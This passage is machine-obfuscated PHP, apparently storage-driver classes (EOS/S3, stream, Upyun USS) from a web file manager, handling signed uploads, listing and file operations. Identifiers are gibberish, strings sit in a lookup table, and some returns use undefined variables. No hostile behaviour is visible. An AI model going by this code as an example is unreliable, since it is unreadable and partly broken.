IO::info($ÛŸ¥­ı[$ßŞŞúİ[94]]); $ÅíÆû‰Â = is_array($ÅíÆû‰Â) ? $ÅíÆû‰Â : array(); $ÛŸ¥­ı = array_merge($ÅíÆû‰Â, $ÛŸ¥­ı); $ÛŸ¥­ı[$ßŞŞúİ[96]] = Action($ßŞŞúİ[1169])->shareItemInfo($ÛŸ¥­ı); } unset($ÛŸ¥­ı); return $úĞµê¬; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($´ÖÅöÍÃ) { parent::__construct($´ÖÅöÍÃ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($·î¢ë‡´) { parent::__construct($·î¢ë‡´); $this->signatureVersion($_SERVER[¤·²È‰º][226]); } public function uploadFormData($º×»Ú¼„, $ö­éúÌí = 3600) { $±ÍÊ½» =& $_SERVER[¤·²È‰º]; $ˆ´‚Œœ = $±ÍÊ½»[208]; $” ­¹ = $±ÍÊ½»[1340]; $Ğ¸Şãœ = $±ÍÊ½»[72]; $­œ¯ì = gmdate($±ÍÊ½»[1341]); $š »¡±Ä = gmdate($±ÍÊ½»[752]); $›ÖÈñÃŠ = $±ÍÊ½»[1342]; $ôŸŸ«äÕ = $ö­éúÌí . $±ÍÊ½»[12]; $ùî»Ş¸× = $±ÍÊ½»[1304]; $€“¡–»è = array($this->accessKey, $š »¡±Ä, $this->region, $Ğ¸Şãœ, $›ÖÈñÃŠ); $ê‘“«ò = implode($±ÍÊ½»[8], $€“¡–»è); $¹ò”µ‰ = array($±ÍÊ½»[1306] => gmdate($±ÍÊ½»[1305], strtotime($±ÍÊ½»[1343])), $±ÍÊ½»[1307] => array(array($±ÍÊ½»[1309] => $this->bucket), array($±ÍÊ½»[1308] => $ˆ´‚Œœ), array($±ÍÊ½»[1310], $±ÍÊ½»[1311], $±ÍÊ½»[12]), array($±ÍÊ½»[1310], $±ÍÊ½»[1344], $±ÍÊ½»[12]), array($±ÍÊ½»[1310], $±ÍÊ½»[1345], $±ÍÊ½»[12]), array($±ÍÊ½»[1312] => $ùî»Ş¸×), array($±ÍÊ½»[1346] => $ê‘“«ò), array($±ÍÊ½»[1347] => $” ­¹), array($±ÍÊ½»[1348] => $­œ¯ì), array($±ÍÊ½»[1349] => $ôŸŸ«äÕ))); $šÓâ‘¬ = base64_encode(json_encode($¹ò”µ‰)); $ôÈäáˆÂ = hash_hmac($±ÍÊ½»[1350], $š »¡±Ä, $±ÍÊ½»[1351] . $this->secret, !0); $–ç¹¸Õ• = hash_hmac($±ÍÊ½»[1350], $this->region, $ôÈäáˆÂ, !0); $ğš¼êÖ¦ = hash_hmac($±ÍÊ½»[1350], $Ğ¸Şãœ, $–ç¹¸Õ•, !0); $’ÚÛô¢Ä = hash_hmac($±ÍÊ½»[1350], $›ÖÈñÃŠ, $ğš¼êÖ¦, !0); $¯·ø´ŒÔ = hash_hmac($±ÍÊ½»[1350], $šÓâ‘¬, $’ÚÛô¢Ä); $’ıšÊß… = array($±ÍÊ½»[225] => $±ÍÊ½»[12], $±ÍÊ½»[1352] => $±ÍÊ½»[12], $±ÍÊ½»[1308] => $ˆ´‚Œœ, $±ÍÊ½»[1312] => $ùî»Ş¸×, $±ÍÊ½»[1316] => $šÓâ‘¬, $±ÍÊ½»[1353] => $ê‘“«ò, $±ÍÊ½»[1354] => $” ­¹, $±ÍÊ½»[1355] => $­œ¯ì, $±ÍÊ½»[1356] => $ôŸŸ«äÕ, $±ÍÊ½»[1357] => $¯·ø´ŒÔ, $±ÍÊ½»[191] => $this->getHost()); return $’ıšÊß…; } } goto CÆõÈîŠ¸; ašÙ”–»©•: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($•¨ÒÁô, $´’£ù¯¾ = 0) { parent::__construct(); $this->source = $•¨ÒÁô; $this->sourceSize = $´’£ù¯¾; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($’Â­àØ = false) { return $this->sourceSize; } public function getContent($óÆöÄÂñ = false) { return $this->fileSubstr($óÆöÄÂñ, 0, $this->sourceSize); } public function fileSubstr($¿µª½Æ = false, $š‹è“Ò® = 0, $Ööé›«ª = 0) { if (!$Ööé›«ª) { $Ööé›«ª = $this->sourceSize; } $“İåà¾ = $this->sourceSize - $š‹è“Ò®; if ($Ööé›«ª >= $“İåà¾) { $Ööé›«ª = $“İåà¾; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $š‹è“Ò®, $Ööé›«ª); } if ($this->sourceType == self::TYPE_FILE) { if ($Ööé›«ª <= 0) { return $_SERVER[¤·²È‰º][12]; } $õÆ±²ò = ftell($this->source); fseek_64($this->source, $õÆ±²ò + $š‹è“Ò®); $ÛŞÛØˆî = @fread($this->source, $Ööé›«ª); fseek_64($this->source, $õÆ±²ò); return $ÛŞÛØˆî; } } public function hashMd5($ºØß¦¹” = false) { return md5($this->getContent()); } public static function hash($üâ¶Áœ, $õ½¡º›º = 0) { $ºÒ¦—ŞØ = new PathDriverStream($üâ¶Áœ, $õ½¡º›º); return $ºÒ¦—ŞØ->hashSimple($üâ¶Áœ); } public static function md5($Ãæ¡çè”, $„¯¨·÷ = 0) { $¸Ùó•‰® = new PathDriverStream($Ãæ¡çè”, $„¯¨·÷); return $¸Ùó•‰®->hashMd5($Ãæ¡çè”); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\x70\x3a\x2f\x2f\166\60\x2e\x61\160\x69\x2e\x75\160\171\x75\156\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Ğ¢™ù÷Å) { parent::__construct(); $this->_init($Ğ¢™ù÷Å); } public function _init($¶´Ç¬Îá) { $ôÌËî“ =& $_SERVER[¤·²È‰º]; foreach ($¶´Ç¬Îá as $—‰Ñšà› => $Å¨¶‡Éï) { if (isset($this->{$—‰Ñšà›})) { $this->{$—‰Ñšà›} = $Å¨¶‡Éï; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ôÌËî“[1447] . LNG($ôÌËî“[1378])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($äŞñ°õÆ, $–Ô Í” = "\107\105\x54") { $À°­ïÄ =& $_SERVER[¤·²È‰º]; $“†¥÷Áó = gmdate($À°­ïÄ[1411]); $·ÃÑì“× = base64_encode(hash_hmac($À°­ïÄ[1448], "{$–Ô Í”}\x26{$äŞñ°õÆ}\46{$“†¥÷Áó}", md5("{$this->userpass}"), !0)); $ò¢öÛİØ = array("\x41\x75\164\150\x6f\x72\151\x7a\x61\x74\151\157\156\x3a\125\120\x59\x55\116\x20{$this->username}\72{$·ÃÑì“×}", "\x44\141\x74\145\72{$“†¥÷Áó}"); return $ò¢öÛİØ; } public function ussRequest($•ğÚŒ†, $×§†ÕÉ¦ = "\107\105\x54", $ÆÛ ñà¸ = false, $«ö÷éÕ¼ = false, $ø­áä¤² = false) { $‚Á˜ûØ =& $_SERVER[¤·²È‰º]; $•ğÚŒ† = trim($•ğÚŒ†, $‚Á˜ûØ[8]); $½ÆƒÉ¹è = "\57{$this->bucket}\x2f{$•ğÚŒ†}"; $éŠÚ˜‚² = $this->ussHeaders($½ÆƒÉ¹è, $×§†ÕÉ¦); if ($«ö÷éÕ¼) { $éŠÚ˜‚² = array_merge($éŠÚ˜‚², $«ö÷éÕ¼); } $†É÷Ÿ˜ = url_request($this->endpoint . $½ÆƒÉ¹è, $×§†ÕÉ¦, $ÆÛ ñà¸, $éŠÚ˜‚², $ø­áä¤²); if (!$†É÷Ÿ˜) { return array($‚Á˜ûØ[1185] => !1, $‚Á˜ûØ[1187] => $‚Á˜ûØ[1449]); } if (strtolower($×§†ÕÉ¦) == $‚Á˜ûØ[206] || in_array($†É÷Ÿ˜[$‚Á˜ûØ[1185]], array($‚Á˜ûØ[1304], $‚Á˜ûØ[1450]))) { $ÆÛ ñà¸ = $†É÷Ÿ˜[$‚Á˜ûØ[1451]]; } else { $ÆÛ ñà¸ = json_decode($†É÷Ÿ˜[$‚Á˜ûØ[1187]], !0); if (!$ÆÛ ñà¸) { $ÆÛ ñà¸ = $†É÷Ÿ˜[$‚Á˜ûØ[1187]]; } else { if (!$†É÷Ÿ˜[$‚Á˜ûØ[751]] && isset($ÆÛ ñà¸[$‚Á˜ûØ[1452]])) { $ÆÛ ñà¸ = $ÆÛ ñà¸[$‚Á˜ûØ[1452]]; } } } return array($‚Á˜ûØ[1185] => $†É÷Ÿ˜[$‚Á˜ûØ[751]], $‚Á˜ûØ[1187] => $ÆÛ ñà¸); } public function mkfile($ÊÓóÇ¯ñ, $¡—ôØ = '', $Üõ¾¥…ö = REPEAT_RENAME) { if ($this->setContent($ÊÓóÇ¯ñ, $¡—ôØ)) { return $this->getPathOuter($ÊÓóÇ¯ñ); } return !1; } public function mkdir($ùâÁ¾‰±, $Ô¡¾×ş = REPEAT_SKIP) { $ôšÎ¡™° =& $_SERVER[¤·²È‰º]; $ğµæ„¸Ø = trim($ùâÁ¾‰±, $ôšÎ¡™°[8]); if ($this->_isFolder($ğµæ„¸Ø)) { return $this->getPathOuter($ğµæ„¸Ø); } $àƒçÓ”„ = array($ôšÎ¡™°[1453]); $îê¸Üİº = $this->ussRequest($ğµæ„¸Ø, $ôšÎ¡™°[236], !1, $àƒçÓ”„); return $îê¸Üİº[$ôšÎ¡™°[1185]] ? $this->getPathOuter($ğµæ„¸Ø) : !1; } public function copyFile($®õé¬, $Ü¾ö£‹ú) { $ÓÆÂû…ù =& $_SERVER[¤·²È‰º]; $÷Ú¯ë©å = array($ÓÆÂû…ù[1454] . "\x2f{$this->bucket}\57{$®õé¬}", $ÓÆÂû…ù[1455]); $çò‚Éõ” = $this->ussRequest($Ü¾ö£‹ú, $ÓÆÂû…ù[238], !1, $÷Ú¯ë©å); return $çò‚Éõ”[$ÓÆÂû…ù[1185]] ? !0 : $this->getPathOuter($Ü¾ö£‹ú); } public function moveFile($ñİº¾¤…, $¼‹úÒ¸) { $±ÖÚĞ®± =& $_SERVER[¤·²È‰º]; $¹òØı›À = array($±ÖÚĞ®±[1456] . "\57{$this->bucket}\57{$ñİº¾¤…}", $±ÖÚĞ®±[1455]); $Ö©ƒšÎù = $this->ussRequest($¼‹úÒ¸, $±ÖÚĞ®±[238], !1, $¹òØı›À); return $Ö©ƒšÎù[$±ÖÚĞ®±[1185]] ? !0 : $this->getPathOuter($¼‹úÒ¸); } public function delFile($™ø×Æïá) { $ãƒ¢Ú›¡ =& $_SERVER[¤·²È‰º]; $›Šè ­¿ = $this->ussRequest($™ø×Æïá, $ãƒ¢Ú›¡[1457]); return $›Šè ­¿[$ãƒ¢Ú›¡[1185]] ? !0 : !1; } public function delFolder($æ„Æ„¡ä) { $Ôø±şÉ =& $_SERVER[¤·²È‰º]; if (!$this->exist($æ„Æ„¡ä)) { return !0; } $this->listItemCache = !1; $¢ØğÉî = $‘È›ÛÌá = array(); $this->fileList($æ„Æ„¡ä, $¢ØğÉî, $‘È›ÛÌá, !0); $this->listItemCache = !0; foreach ($‘È›ÛÌá as $ºäÜ¢¬¢) { $œ óÚÈÃ = $this->ussRequest($ºäÜ¢¬¢[$Ôø±şÉ[42]], $Ôø±şÉ[1457]); if (!$œ óÚÈÃ[$Ôø±şÉ[1185]]) { return !1; } } foreach ($¢ØğÉî as $Õ˜Û¸Ç) { $œ óÚÈÃ = $this->ussRequest($Õ˜Û¸Ç, $Ôø±şÉ[1457]); if (!$œ óÚÈÃ[$Ôø±şÉ[1185]]) { return !1; } } $œ óÚÈÃ = $this->ussRequest($æ„Æ„¡ä, $Ôø±şÉ[1457]); return $œ óÚÈÃ[$Ôø±şÉ[1185]]; } public function rename($—˜²­›…, $•˜Ñ•ÌÒ) { if ($this->isFile($—˜²­›…)) { $•˜Ñ•ÌÒ = get_path_father($—˜²­›…) . $•˜Ñ•ÌÒ; return $this->moveFile($—˜²­›…, $•˜Ñ•ÌÒ); } return $this->renameObject($—˜²­›…, $•˜Ñ•ÌÒ); } public function fileInfo($¹Ô¿ÑÆú, $×šŠšâ¿ = false, $Ú¥ æÌ = array()) { $çşç‰Ì¢ =& $_SERVER[¤·²È‰º]; $Ş§©‰“„ = array($çşç‰Ì¢[42] => $this->pathThis($¹Ô¿ÑÆú), $çşç‰Ì¢[94] => $this->getPathOuter($çşç‰Ì¢[8] . $¹Ô¿ÑÆú), $çşç‰Ì¢[43] => $çşç‰Ì¢[209], $çşç‰Ì¢[86] => isset($Ú¥ æÌ[$çşç‰Ì¢[86]]) ? $Ú¥ æÌ[$çşç‰Ì¢[86]] : 0, $çşç‰Ì¢[184] => $this->ext($¹Ô¿ÑÆú)); if ($×šŠšâ¿) { return $Ş§©‰“„; } $Ş§©‰“„[$çşç‰Ì¢[210]] = $Ş§©‰“„[$çşç‰Ì¢[95]] = 0; $Ş§©‰“„[$çşç‰Ì¢[211]] = $Ş§©‰“„[$çşç‰Ì¢[212]] = !0; if (empty($Ú¥ æÌ)) { $Ú¥ æÌ = $this->objectMeta($¹Ô¿ÑÆú); if (!$Ú¥ æÌ) { return $Ş§©‰“„; } } $Ş§©‰“„[$çşç‰Ì¢[210]] = intval($Ú¥ æÌ[$çşç‰Ì¢[1458]]); $Ş§©‰“„[$çşç‰Ì¢[95]] = intval($Ú¥ æÌ[$çşç‰Ì¢[1459]]); $Ş§©‰“„[$çşç‰Ì¢[86]] = $Ú¥ æÌ[$çşç‰Ì¢[86]]; return $Ş§©‰“„; } public function folderInfo($ôğğÑŒÉ, $ÛÒÚ–ê÷ = false) { $Ûõ ÊÇş =& $_SERVER[¤·²È‰º]; $ËÕòøçü = array($Ûõ ÊÇş[42] => $this->pathThis($ôğğÑŒÉ), $Ûõ ÊÇş[94] => $this->getPathOuter($Ûõ ÊÇş[8] . $ôğğÑŒÉ), $Ûõ ÊÇş[43] => $Ûõ ÊÇş[85]); if ($ÛÒÚ–ê÷) { return $ËÕòøçü; } $ËÕòøçü[$Ûõ ÊÇş[210]] = $ËÕòøçü[$Ûõ ÊÇş[95]] = 0; $ËÕòøçü[$Ûõ ÊÇş[211]] = $ËÕòøçü[$Ûõ ÊÇş[212]] = !0; if (empty($¶ÎÁÎ„¡)) { $¶ÎÁÎ„¡ = $this->objectMeta($ôğğÑŒÉ); if (!$¶ÎÁÎ„¡) { return $ËÕòøçü; } } $ËÕòøçü[$Ûõ ÊÇş[210]] = intval($¶ÎÁÎ„¡[$Ûõ ÊÇş[1458]]); $ËÕòøçü[$Ûõ ÊÇş[95]] = intval($¶ÎÁÎ„¡[$Ûõ ÊÇş[1459]]); return $ËÕòøçü; } private function listObjs($ûñ³Òß›, $æß‚îÉ = 0, $ıïÔ«°ò = 1000) { $¾ ù€É =& $_SERVER[¤·²È‰º]; $Çêááí€ = array($¾ ù€É[1460], $¾ ù€É[1461] . $ıïÔ«°ò); if ($æß‚îÉ) { $Çêááí€[] = $¾ ù€É[1462] . $æß‚îÉ; } $™éâÖ¬ = $this->ussRequest($ûñ³Òß›, $¾ ù€É[240], !1, $Çêááí€); return !$™éâÖ¬[$¾ ù€É[1185]] ? !1 : $™éâÖ¬[$¾ ù€É[1187]]; } private function fileList($îéÎ©œ‘, &$Ä£îÒÃÌ, &$¼­­úæÙ, $Æòõ• = false) { $´æª€»Î =& $_SERVER[¤·²È‰º]; $àìêÒç = $´æª€»Î[12]; $õ‚»¦öÉ = 1000; $ş¼½íË = rtrim($îéÎ©œ‘, $´æª€»Î[8]) . $´æª€»Î[8]; while (!0) { check_abort(); $Ìêê«Àß = $this->listObjs($îéÎ©œ‘, $àìêÒç, $õ‚»¦öÉ); if (!$Ìêê«Àß) { return !1; } $àìêÒç = isset($Ìêê«Àß[$´æª€»Î[1463]]) ? $Ìêê«Àß[$´æª€»Î[1463]] : $´æª€»Î[12]; $†èõˆÉÍ = isset($Ìêê«Àß[$´æª€»Î[1464]]) ? $Ìêê«Àß[$´æª€»Î[1464]] : array(); foreach ($†èõˆÉÍ as $õàÃ‰ƒ) { $…¬†Åµ° = $õàÃ‰ƒ[$´æª€»Î[43]] == $´æª€»Î[85] ? !0 : !1; $é¥‘ö¸¤ = ltrim($ş¼½íË . $õàÃ‰ƒ[$´æª€»Î[42]], $´æª€»Î[8]) . ($…¬†Åµ° ? $´æª€»Î[8] : $´æª€»Î[12]); $ıÃßûÈ¿ = array($´æª€»Î[42] => $é¥‘ö¸¤, $´æª€»Î[43] => $…¬†Åµ° ? $´æª€»Î[85] : $´æª€»Î[209], $´æª€»Î[86] => $õàÃ‰ƒ[$´æª€»Î[346]], $´æª€»Î[1459] => $õàÃ‰ƒ[$´æª€»Î[1465]]); $this->cacheMethodInfoSet($é¥‘ö¸¤, $…¬†Åµ°, $ıÃßûÈ¿); if ($…¬†Åµ°) { $Ä£îÒÃÌ[] = $é¥‘ö¸¤; if ($Æòõ•) { $this->fileList($é¥‘ö¸¤, $Ä£îÒÃÌ, $¼­­úæÙ, $Æòõ•); } continue; } $¼­­úæÙ[] = $ıÃßûÈ¿; } if (count($†èõˆÉÍ) < $õ‚»¦öÉ) { break; } } $this->cacheMethodInfoSet($îéÎ©œ‘, !0); } public function listPath($ğş¶ó›Ö, $ïøÖ‘š” = false) { $Íü‚ˆ¿³ =& $_SERVER[¤·²È‰º]; $ğàƒöş¸ = $ŒµûğÏÃ = array(); $this->fileList($ğş¶ó›Ö, $ğàƒöş¸, $ŒµûğÏÃ); foreach ($ğàƒöş¸ as $„«©ŸĞ => $­øÍ”ë«) { $ğàƒöş¸[$„«©ŸĞ] = $this->folderInfo($­øÍ”ë«, $ïøÖ‘š”); } foreach ($ŒµûğÏÃ as $„«©ŸĞ => $­øÍ”ë«) { $ŒµûğÏÃ[$„«©ŸĞ] = $this->fileInfo($­øÍ”ë«[$Íü‚ˆ¿³[42]], $ïøÖ‘š”, $­øÍ”ë«); } return array($Íü‚ˆ¿³[92] => $ğàƒöş¸, $Íü‚ˆ¿³[93] => $ŒµûğÏÃ); } public function has($ó³şÅÂ, $ÍŸ¸üÓ† = false, $çÚ¸²Õ = true) { $ªüÏıâê =& $_SERVER[¤·²È‰º]; $’Óáøµ = $ªüÏıâê[12]; $®³Õù·ë = 500; $ºã£âŒ› = 0; $·Úšªæ = 0; $ó÷ËûÇ = rtrim($ó³şÅÂ, $ªüÏıâê[8]) . $ªüÏıâê[8]; while (!0) { check_abort(); $×«ÃºÚ„ = $this->listObjs($ó³şÅÂ, $’Óáøµ, $®³Õù·ë); if (!$×«ÃºÚ„) { return !1; } $’Óáøµ = isset($×«ÃºÚ„[$ªüÏıâê[1463]]) ? $×«ÃºÚ„[$ªüÏıâê[1463]] : $ªüÏıâê[12]; $½ÍØ€úü = isset($×«ÃºÚ„[$ªüÏıâê[1464]]) ? $×«ÃºÚ„[$ªüÏıâê[1464]] : array(); if (empty($½ÍØ€úü)) { break; } $¥ßˆ¼•É = array_filter($½ÍØ€úü, function ($îè³§—ß) { $…¼›•Æ =& $_SERVER[¤·²È‰º]; return $îè³§—ß[$…¼›•Æ[43]] == $…¼›•Æ[85]; }); $·ÈáÏÑ¢ = count($½ÍØ€úü); $¥ßˆ¼•É = count($¥ßˆ¼•É); $£ƒ†’„ = $·ÈáÏÑ¢ - $¥ßˆ¼•É; if ($ÍŸ¸üÓ†) { $·Úšªæ += $¥ßˆ¼•É; $ºã£âŒ› += $£ƒ†’„; if ($·ÈáÏÑ¢ < $®³Õù·ë) { break; } continue; } if ($çÚ¸²Õ) { if ($£ƒ†’„) { return !0; } } else { if ($¥ßˆ¼•É) { return !0; } } if ($·ÈáÏÑ¢ < $®³Õù·ë) { break; } } if ($ÍŸ¸üÓ†) { return array($ªüÏıâê[217] => $ºã£âŒ›, $ªüÏıâê[218] => $·Úšªæ); } return !1; } public function listAll($«•Ôœ‰ì) { $Å±•Ğ‚ú =& $_SERVER[¤·²È‰º]; $·Ãˆá´§ = $Ü€º»á = array(); $this->fileList($«•Ôœ‰ì, $·Ãˆá´§, $Ü€º»á, !0); $—Û´—×ª = array(); foreach ($Ü€º»á as $À«ãÜÍ ) { $—Û´—×ª[$À«ãÜÍ [$Å±•Ğ‚ú[42]]] = $À«ãÜÍ [$Å±•Ğ‚ú[86]]; } foreach ($·Ãˆá´§ as $À«ãÜÍ ) { if (is_string($À«ãÜÍ )) { $—Û´—×ª[$À«ãÜÍ ] = 0; } } return $this->listAllFiles($«•Ôœ‰ì, array_keys($—Û´—×ª), $—Û´—×ª); } public function canRead($ŒÄß‡Â) { return $this->exist($ŒÄß‡Â) ? !0 : !1; } public function canWrite($Şéš‹Ùš) { return $this->exist($Şéš‹Ùš) ? !0 : !1; } public function getContent($§õ•Şô) { return $this->fileSubstr($§õ•Şô, 0, -1); } public function setContent($©ƒ‚§À, $ë¬¾Ü¸Ã = '') { $£ö•šûğ =& $_SERVER[¤·²È‰º]; if (!$ë¬¾Ü¸Ã) { $‹ÉàÔë´ = $this->ussRequest($©ƒ‚§À, $£ö•šûğ[236]); return $‹ÉàÔë´[$£ö•šûğ[1185]]; } $©‡€Ç¡ = $this->tempFile($this->pathThis($©ƒ‚§À)); file_put_contents($©‡€Ç¡, $ë¬¾Ü¸Ã); if ($this->upload($©ƒ‚§À, $©‡€Ç¡)) { $this->tempFileRemve($©‡€Ç¡); return !0; } return !1; } public function fileSubstr($ ÅÕıîÓ, $­Ãà±£§, $«±óÑò©) { $¤¦ÓÖé´ =& $_SERVER[¤·²È‰º]; if (!($ÓÁØÃ‚È = $this->link($ ÅÕıîÓ))) { return !1; } $’ØĞˆÏÀ = !1; if ($«±óÑò© > 0) { $öé×êœÂ = $­Ãà±£§ + $«±óÑò© - 1; $’ØĞˆÏÀ = array($¤¦ÓÖé´[1426] . $­Ãà±£§ . $¤¦ÓÖé´[394] . $öé×êœÂ); } $áå±äü¯ = url_request($ÓÁØÃ‚È, $¤¦ÓÖé´[240], !1, $’ØĞˆÏÀ); return $áå±äü¯[$¤¦ÓÖé´[751]] ? $áå±äü¯[$¤¦ÓÖé´[1187]] : !1; } public function upload($ğ¢€àØ, $şÖ˜ØÌõ, $‡è¸½ëÊ = false, $·À´öùé = REPEAT_REPLACE) { $÷Ş”ã‚Ÿ =& $_SERVER[¤·²È‰º]; $¼üû¤´ = IO::size($şÖ˜ØÌõ); if ($¼üû¤´ <= 1024 * 1024 * 200) { $‡ğ½‹È = array($÷Ş”ã‚Ÿ[1466] . $şÖ˜ØÌõ); $Ë¸àÖâØ = $this->ussRequest($ğ¢€àØ, $÷Ş”ã‚Ÿ[238], $‡ğ½‹È); return $Ë¸àÖâØ[$÷Ş”ã‚Ÿ[1185]] ? $this->getPathOuter($ğ¢€àØ) : !1; } $¸•’âûü = 1024 * 1024 * 10; $’±¨™õ¤ = array($÷Ş”ã‚Ÿ[1467], $÷Ş”ã‚Ÿ[1468] . $¼üû¤´, $÷Ş”ã‚Ÿ[1469], $÷Ş”ã‚Ÿ[1470] . $¸•’âûü); $Ë¸àÖâØ = $this->ussRequest($ğ¢€àØ, $÷Ş”ã‚Ÿ[238], !1, $’±¨™õ¤); if (!$Ë¸àÖâØ[$÷Ş”ã‚Ÿ[1185]]) { return !1; } $ûä•÷¶ã = $Ë¸àÖâØ[$÷Ş”ã‚Ÿ[1187]]; $¼¸óò = 0; $•ë¾çô = $ûä•÷¶ã[$÷Ş”ã‚Ÿ[1471]]; $ò«¼™¦µ = fopen($şÖ˜ØÌõ, $÷Ş”ã‚Ÿ[1375]); if (!$ò«¼™¦µ) { return !1; } do { $¾…ùèÃ€ = $ûä•÷¶ã[$÷Ş”ã‚Ÿ[1472]]; fseek_64($ò«¼™¦µ, $¼¸óò); $™÷ä Å = fread($ò«¼™¦µ, $¾…ùèÃ€); $÷¡½¤À = 0; do { $÷¡½¤À++; $ûä•÷¶ã = $this->uploadPart($ğ¢€àØ, $ûä•÷¶ã, $™÷ä Å); } while (!$ûä•÷¶ã && $÷¡½¤À < 3); if (!$ûä•÷¶ã) { return !1; } $•ë¾çô = $ûä•÷¶ã[$÷Ş”ã‚Ÿ[1471]]; $¼¸óò += $¾…ùèÃ€; } while ($•ë¾çô != -1); fclose($ò«¼™¦µ); $’±¨™õ¤ = array($÷Ş”ã‚Ÿ[1473], $÷Ş”ã‚Ÿ[1474] . $ûä•÷¶ã[$÷Ş”ã‚Ÿ[1475]], $÷Ş”ã‚Ÿ[1469]); $Ë¸àÖâØ = $this->ussRequest($ğ¢€àØ, $÷Ş”ã‚Ÿ[238], !1, $’±¨™õ¤); return $Ë¸àÖâØ[$÷Ş”ã‚Ÿ[1185]] ? $this->getPathOuter($üÈÏ»’ï) : !1; } private function uploadPart($ÍÌşÃ¶Ó, $‹€±»ò, &$Ü™Áİàª) { $Œ¹®†Ò“ =& $_SERVER[¤·²È‰º]; $š¢–Ñ” = array($Œ¹®†Ò“[1476], $Œ¹®†Ò“[1474] . $‹€±»ò[$Œ¹®†Ò“[1475]], $Œ¹®†Ò“[1477] . $‹€±»ò[$Œ¹®†Ò“[1471]], $Œ¹®†Ò“[152] . $‹€±»ò[$Œ¹®†Ò“[1472]]); $Œâ€Ù ° = $this->ussRequest($ÍÌşÃ¶Ó, $Œ¹®†Ò“[238], $Ü™Áİàª, $š¢–Ñ”); return !$Œâ€Ù °[$Œ¹®†Ò“[1185]] ? $Œâ€Ù °[$Œ¹®†Ò“[1185]] : $Œâ€Ù °[$Œ¹®†Ò“[1187]]; } public function uploadFormData($ìÇ“Ğ’ , $¼ñªı = 3600) { return $this->uploadPolicy($ìÇ“Ğ’ , $¼ñªı); } public function multiUploadFormData($½êøØ¬Ê, $·˜Â¾Î  = 3600) { $çÂğ¤ßş =& $_SERVER[¤·²È‰º]; $„µĞ©Ùñ = (int) $GLOBALS[$çÂğ¤ßş[7]][$çÂğ¤ßş[86]]; return $this->uploadPolicy($½êøØ¬Ê, $·˜Â¾Î , $„µĞ©Ùñ); } private function uploadPolicy($ˆó‹áÀ†, $êÎ³Ôº = 3600, $¾–®Áà = 0) { $àÏ‹ ™Á =& $_SERVER[¤·²È‰º]; $Û›Øº‘ã = $àÏ‹ ™Á[8] . $this->bucket; $ÌÛú—¼ = gmdate($àÏ‹ ™Á[1411]); $ïó¼¹ª = array($àÏ‹ ™Á[1478] => $this->bucket, $àÏ‹ ™Á[1479] => $ˆó‹áÀ†, $àÏ‹ ™Á[1480] => time() + $êÎ³Ôº, $àÏ‹ ™Á[1481] => $ÌÛú—¼); if ($¾–®Áà) { $ïó¼¹ª[$àÏ‹ ™Á[1391]] = $¾–®Áà; } $şìÃù·Å = base64_encode(json_encode($ïó¼¹ª)); $…¾”á­ï = base64_encode(hash_hmac($àÏ‹ ™Á[1448], "\x50\x4f\x53\x54\x26{$Û›Øº‘ã}\46{$ÌÛú—¼}\x26{$şìÃù·Å}", md5("{$this->userpass}"), !0)); $ëªîÛî = array($àÏ‹ ™Á[1316] => $şìÃù·Å, $àÏ‹ ™Á[1482] => "\x55\x50\x59\125\116\40{$this->username}\72{$…¾”á­ï}", $àÏ‹ ™Á[191] => $this->endpoint . $Û›Øº‘ã); return $ëªîÛî; } public function download($¤ıá³ìœ, $¼Ê£¤şå) { $ËÎçê§Ä = IO::getPathInner(IO::mkfile($¼Ê£¤şå)); if (!($äîàÆ´ = $this->link($¤ıá³ìœ))) { return !1; } $éçÑ¹» = 0; $¸­›ßŒ = 1024 * 200; $ª©Ì›×Ç = fopen($ËÎçê§Ä, $_SERVER[¤·²È‰º][1432]); while (!0) { $Íƒİßª = $this->fileSubstr($¤ıá³ìœ, $éçÑ¹», $¸­›ßŒ); if ($Íƒİßª === !1) { return !1; } fwrite($ª©Ì›×Ç, $Íƒİßª); $éçÑ¹» += $¸­›ßŒ; if (strlen($Íƒİßª) < $¸­›ßŒ) { break; } } fclose($ª©Ì›×Ç); return $¼Ê£¤şå; } public function link($ƒØ„•¢Ø, $³àÙ¾û = array()) { $‡…ŸĞ¦ =& $_SERVER[¤·²È‰º]; $ƒØ„•¢Ø = trim($ƒØ„•¢Ø, $‡…ŸĞ¦[8]); if (!empty($this->token)) { $¡­á— = strtotime(date($‡…ŸĞ¦[1483])); $Õ€—Ñ‚š = substr(md5($this->token . $‡…ŸĞ¦[293] . $¡­á— . $‡…ŸĞ¦[1484] . $ƒØ„•¢Ø), 12, 8) . $¡­á—; $³àÙ¾û[] = $‡…ŸĞ¦[1485] . $Õ€—Ñ‚š; } $ã×¨Ë›² = !empty($³àÙ¾û) ? $‡…ŸĞ¦[83] . implode($‡…ŸĞ¦[293], $³àÙ¾û) : $‡…ŸĞ¦[12]; return $this->getHost() . $‡…ŸĞ¦[8] . $ƒØ„•¢Ø . $ã×¨Ë›²; } public function fileOut($·’Ğ®Ôİ, $¾Œ«Ü¸¶ = false, $ßÇ÷—±ß = false, $Õ²§¼ø = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($·’Ğ®Ôİ, $¾Œ«Ü¸¶, $ßÇ÷—±ß, $Õ²§¼ø); } if (!$ßÇ÷—±ß) { $ßÇ÷—±ß = $this->pathThis($·’Ğ®Ôİ); } $öëÀ¢€Í = $¾Œ«Ü¸¶ ? array($_SERVER[¤·²È‰º][1486] . rawurlencode($ßÇ÷—±ß)) : array(); $ñ  ‚­¯ = $this->link($·’Ğ®Ôİ, $öëÀ¢€Í); $this->fileOutLink($ñ  ‚­¯); } public function fileOutServer($ã™×Æ¢, $…¥×Æ™¢ = false, $æï Ÿ•ú = false, $ù†¼çŠ’ = '') { parent::fileOut($ã™×Æ¢, $…¥×Æ™¢, $æï 